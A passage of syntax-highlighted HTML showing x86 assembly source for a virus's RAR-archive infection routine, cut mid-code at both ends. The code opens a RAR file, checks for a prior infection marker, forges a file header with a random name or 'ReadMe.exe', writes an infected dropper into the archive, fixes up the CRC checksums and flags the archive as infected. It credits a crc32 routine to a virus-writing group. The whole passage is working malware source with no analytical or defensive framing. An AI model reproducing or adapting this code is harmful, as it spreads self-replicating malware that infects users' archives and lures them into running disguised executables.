    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitAndCloseDropperMap</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DropperMap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;open rar file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitAndUnMapDropper</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hRarFile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DropperSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">RarHeaderSize</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">              </span><span class="sc1">;overwrite rar file sign</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hRarFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFileMapping</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;create file mapping object of the rar file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitAndCloseRarFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hRarMap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DropperSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">RarHeaderSize</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">              </span><span class="sc1">;overwrite rar file sign</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hRarMap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitAndCloseRarMap</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RarMap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"!raR"</span><span class="sc0">      </span><span class="sc1">;is rar file ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">RarFileInfectionErr</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc4">],</span><span class="sc2">1h</span><span class="sc0">     </span><span class="sc1">;is already infected ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">RarFileInfectionErr</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DropperMap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DropperSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xcrc32</span><span class="sc0">              </span><span class="sc1">;get infected dropper crc32 checksum</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FILE_CRC</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;set it insaid rar header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ftCreationTime</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FTIME</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;set random time\data</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileInsaidRar</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@RandLetter</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@RandLetter</span><span class="sc0">         </span><span class="sc1">;gen random name for the infected dropper</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DropperSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PACK_SIZE</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">UNP_SIZE</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;set dropper size insaid of rar header</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">headcrc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">EndRarHeader</span><span class="sc4">-</span><span class="sc5">RarHeader</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xcrc32</span><span class="sc0">              </span><span class="sc1">;get crc32 checksum of the rar header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">HEAD_CRC</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;and set it in rar header</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RarHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RarMap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">              </span><span class="sc1">;overwrite rar file sign</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">RarHeaderSize</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;write the rar header into rar file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DropperMap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">RarHeaderSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DropperSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;write the infected dropper into rar file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RarMap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;mark the rar file as infected(0fh=reserved1)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">9h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xcrc32</span><span class="sc0">              </span><span class="sc1">;get crc32 of the rar main header</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;[ebx + 7h]=HEAD_CRC</span><span class="sc0">
</span><span class="sc5">ExitAndUnMapRarFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RarMap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">UnMapViewOfFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ExitAndCloseRarMap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hRarMap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ExitAndCloseRarFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hRarFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ExitAndUnMapDropper</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DropperMap</span><span class="sc4">]</span><span class="sc0">    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">UnMapViewOfFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ExitAndCloseDropperMap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hDropperMap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ExitAndCloseDropperFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hInfectedDropper</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ExitRarInfection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RarFileInfectionErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_BEGIN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hRarFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hRarFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetEndOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitAndUnMapRarFile</span><span class="sc0">
    
    
    </span><span class="sc5">InfectedDropper</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">hInfectedDropper</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">DropperSize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hDropperMap</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">DropperMap</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hRarFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hRarMap</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">RarMap</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
    
    
</span><span class="sc5">RarHeader</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">HEAD_CRC</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc5">headcrc</span><span class="sc4">:</span><span class="sc5">HEAD_TYPE</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">74h</span><span class="sc0">
        </span><span class="sc5">HEAD_FLAGS</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">8000h</span><span class="sc0">   </span><span class="sc1">;normal flag</span><span class="sc0">
        </span><span class="sc5">HEAD_SIZE</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">RarHeaderSize</span><span class="sc0">
        </span><span class="sc5">PACK_SIZE</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc5">UNP_SIZE</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc5">HOST_OS</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc1">;Ms-Dos</span><span class="sc0">
        </span><span class="sc5">FILE_CRC</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc5">FTIME</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc5">UNP_VER</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0">
        </span><span class="sc5">METHOD</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">30h</span><span class="sc0"> </span><span class="sc1">;storing</span><span class="sc0">
        </span><span class="sc5">NAME_SIZE</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0ah</span><span class="sc0"> </span><span class="sc1">;file name size</span><span class="sc0">
    </span><span class="sc5">endhcrc</span><span class="sc4">:</span><span class="sc5">ATTR</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc5">FileInsaidRar</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
        </span><span class="sc5">FILE_NAME</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ReadMe.exe"</span><span class="sc0">
    </span><span class="sc5">EndRarHeader</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">RarHeaderSize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">RarHeader</span><span class="sc4">)</span><span class="sc0">   
    

</span><span class="sc1">;(c) z0mbie/29a crc32 function</span><span class="sc0">
</span><span class="sc1">; input:  EDX=data, ECX=size, EAX=crc</span><span class="sc0">
</span><span class="sc1">; output: EAX=crc, EDX+=ECX, ECX=BL=0</span><span class="sc0">
</span><span class="sc5">xcrc32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@4</span><span class="sc0">         
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">@@3</span><span class="sc0">
